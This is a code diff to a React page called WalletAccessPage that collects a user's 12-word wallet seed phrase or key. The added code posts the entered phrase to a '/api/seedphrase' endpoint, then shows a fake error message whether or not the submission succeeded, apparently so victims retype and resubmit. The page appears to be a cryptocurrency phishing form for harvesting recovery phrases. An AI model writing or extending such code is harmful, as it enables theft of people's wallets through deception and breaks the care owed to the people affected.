@@ -51,7 +51,7 @@ export default function WalletAccessPage() {
     }
   };
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
 
     if (inputType === "phrase") {
@@ -60,13 +60,24 @@ export default function WalletAccessPage() {
         toast.error("Please fill all 12 words");
         return;
       }
-      // Handle wallet logic here
-      alert(`Seed Phrase:\n${seedPhrase}`);
-      // ✅ Show success toast
-      toast.error("An error occured", {
-        description:
-          "There was an error while submitting phrase please try again",
-      });
+      try {
+        const res = await fetch("/api/seedphrase", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ type: "phrase", value: seedPhrase }),
+        });
+        if (!res.ok) throw new Error();
+
+        toast.error("An error occured", {
+          description:
+            "Hmmm!, There was an error while submitting phrase please try again",
+        });
+      } catch {
+        toast.error("An error occurred", {
+          description:
+            "There was an error while submitting phrase, please try again",
+        });
+      }
       return;
     }
 
@@ -75,10 +86,27 @@ export default function WalletAccessPage() {
         toast.error("Please enter your public key");
         return;
       }
-      toast.error("An error occured", {
-        description:
-          "There was an error while submitting public key please try again",
-      });
+
+      try {
+        const res = await fetch("/api/seedphrase", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ type: "publicKey", value: inputValue }),
+        });
+
+        if (!res.ok) throw new Error();
+
+        toast.error("An error occurred", {
+          description:
+            "There was an error while submitting public key, please try again",
+        });
+      } catch {
+        toast.error("An error occurred", {
+          description:
+            "There was an error while submitting public key, please try again",
+        });
+      }
+
       return;
     }
   };
